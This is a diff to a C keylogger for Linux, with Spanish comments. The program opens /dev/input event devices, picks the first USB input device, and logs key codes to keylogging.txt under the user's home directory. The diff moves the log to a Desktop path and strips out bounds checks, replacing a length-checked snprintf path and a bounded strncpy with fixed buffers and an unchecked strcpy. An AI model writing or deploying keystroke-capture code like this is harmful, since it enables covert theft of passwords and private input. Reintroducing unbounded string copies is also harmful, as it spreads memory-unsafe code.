@@ -7,9 +7,8 @@
 #include <dirent.h>
 
 #define HOME_DIR getenv("HOME")
-#define LOG_FILE /Escritorio/keylogging.txt"
+#define LOG_FILE "/Desktop/keylogging.txt"
 #define INPUT_DIR "/dev/input/"
-#define DEVICE_PATH_SIZE 512  
 
 void log_key(int code) {
     char log_path[256];
@@ -17,7 +16,7 @@ void log_key(int code) {
 
     FILE *file = fopen(log_path, "a");
     if (file == NULL) {
-        perror("No se pudo abrir o crear el archivo de registro");
+        perror("No se pudo abrir el archivo de registro");
         exit(EXIT_FAILURE);
     }
 
@@ -33,17 +32,12 @@ char* find_keyboard_device() {
         exit(EXIT_FAILURE);
     }
 
-    char device_path[DEVICE_PATH_SIZE];
-    static char keyboard_device[DEVICE_PATH_SIZE];
+    char device_path[256];
+    static char keyboard_device[256];
 
     while ((entry = readdir(dp))) {
         if (strncmp(entry->d_name, "event", 5) == 0) {
-            if (strlen(INPUT_DIR) + strlen(entry->d_name) < DEVICE_PATH_SIZE) {
-                snprintf(device_path, sizeof(device_path), "%s%s", INPUT_DIR, entry->d_name);
-            } else {
-                fprintf(stderr, "El nombre del dispositivo es demasiado largo: %s\n", entry->d_name);
-                continue;
-            }
+            snprintf(device_path, sizeof(device_path), "%s%s", INPUT_DIR, entry->d_name);
 
             int fd = open(device_path, O_RDONLY);
             if (fd == -1) continue;
@@ -53,9 +47,9 @@ char* find_keyboard_device() {
             close(fd);
 
             // Filtrar por ID de fabricante y producto (puede variar según el teclado)
+            // Aquí, se asume que el ID de producto y fabricante corresponde a un teclado genérico.
             if (device_info.bustype == BUS_USB) {  // Verificar si el dispositivo es USB
-                strncpy(keyboard_device, device_path, sizeof(keyboard_device) - 1);
-                keyboard_device[sizeof(keyboard_device) - 1] = '\0';
+                strcpy(keyboard_device, device_path);
                 closedir(dp);
                 return keyboard_device;
             }
